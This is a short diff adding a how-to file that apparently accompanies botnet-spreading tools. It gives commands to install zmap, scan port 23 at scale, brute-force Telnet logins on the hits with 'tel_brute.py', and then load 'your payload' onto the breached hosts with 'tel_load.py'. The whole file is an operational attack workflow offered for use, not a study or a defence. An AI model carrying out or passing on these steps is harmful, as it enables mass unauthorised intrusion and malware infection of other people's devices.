@@ -1,0 +1,16 @@
+ 
+yum update -y
+yum install zmap -y
+ 
+ 
+apt-get update -y
+apt-get install zmap -y
+ 
+ulimit -n 999999
+ 
+zmap -p23 -omfu.txt /without lst
+zmap -p23 -wscan.lst -omfu.txt /with lst
+ 
+python tel_brute.py mfu.txt <threads> output.txt
+Make Sure to put your payload in "tel_load.py"
+python tel_load.py output.txt
